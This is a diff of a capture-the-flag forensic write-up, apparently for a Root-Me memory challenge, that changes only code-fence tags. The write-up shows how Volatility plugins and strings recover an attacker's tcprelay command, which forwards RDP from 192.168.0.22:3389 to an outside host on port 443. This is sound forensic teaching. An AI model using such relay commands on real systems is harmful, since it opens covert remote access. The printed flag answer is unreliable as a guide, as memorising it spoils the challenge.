@@ -13,7 +13,7 @@ The validation flag should have this format : IP:PORT
 ## 🔎 Solution
 To investigate the system's network activity, we began by using the `netscan` plugin, which enumerates active network connections. 
 Interestingly, the results showed only internal port communications - no external IP connections were identified, suggesting possible use of covert channels or redirection.
-```bash
+```
 > ./vol2/volatility2 -f ch2.dmp --profile=Win7SP0x86 netscan | grep "iexplore.exe"
 Volatility Foundation Volatility Framework 2.6
 0x1dedb4f8         TCPv4    127.0.0.1:49178                127.0.0.1:12080      ESTABLISHED      2772     iexplore.exe   
@@ -46,7 +46,7 @@ Volatility Foundation Volatility Framework 2.6
 
 We extended our analysis by leveraging the `consoles` plugin to review the system's console history. 
 This revealed interactions involving the `conhost.exe` process. 
-```bash
+```
 ConsoleProcess: conhost.exe Pid: 2168
 Console: 0x1081c0 CommandHistorySize: 50
 HistoryBufferCount: 3 HistoryBufferMax: 4
@@ -80,7 +80,7 @@ These findings suggest that an attacker may have used `cmd.exe` to execute `tcpr
 
 Since `conhost.exe` handles console input/output, it likely processed these commands. 
 To dig deeper, we performed a memory dump of the `conhost.exe` process using the `memdump` plugin, resulting in the file `2168.dmp`.
-```bash
+```
 > ./vol2/volatility2 -f ch2.dmp --profile=Win7SP0x86 memdump -p 2168 --dump-dir=./root-me 
 Volatility Foundation Volatility Framework 2.6
 ************************************************************************
@@ -89,7 +89,7 @@ Writing conhost.exe [  2168] to 2168.dmp
 
 Finally, we analyzed the dump using `strings` and searched for occurrences of **tcprelay**. 
 This yielded critical information, including the target IP address and port used by the attacker.
-```bash
+```
 > strings ./root-me/2168.dmp | grep "tcprelay.exe"     
 tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
 C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
